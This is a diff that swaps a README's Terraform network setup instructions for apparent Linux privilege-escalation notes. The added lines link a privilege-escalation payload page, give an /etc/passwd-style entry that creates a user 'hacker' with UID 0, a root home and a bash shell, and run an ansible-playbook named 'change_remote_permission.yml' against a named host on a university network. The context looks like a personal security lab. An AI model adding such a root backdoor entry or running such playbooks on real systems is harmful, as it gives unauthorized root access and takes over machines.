@@ -1,17 +1,5 @@
-# Terraform
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 
-## Setup simple network
+hacker:$6$salt$uoy3eLWQ8ZK7dv2FoRxQrkOYfc4FT4qDjc1PCObX5vKn4MZgpfwn8Fm0Ve5u63zmaabiFiQWOZeF2qZDQk18Q0:0:0:Hacker:/root:/bin/bash
 
-Setup environment variables: `source ./PROJECT_RC.sh`
-
-Go into terraform directory: `cd terraform/simple_network`
-
-If first time, init terraform: `terraform init`
-
-Then check it is working through: `terraform plan`
-
-Now deploy the network: `terraform apply`
-
-Ping the machine: `ping EXTERNAL_IP_ADDR` or ssh `ssh cirros@EXTERNAL_IP_ADDR`
-
-To destroy: `terraform destroy`
+ansible-playbook /home/kali/Documents/Vulnerabilities/change_remote_permission.yml -i peilin.wifi.local.cmu.edu, --ask-pass
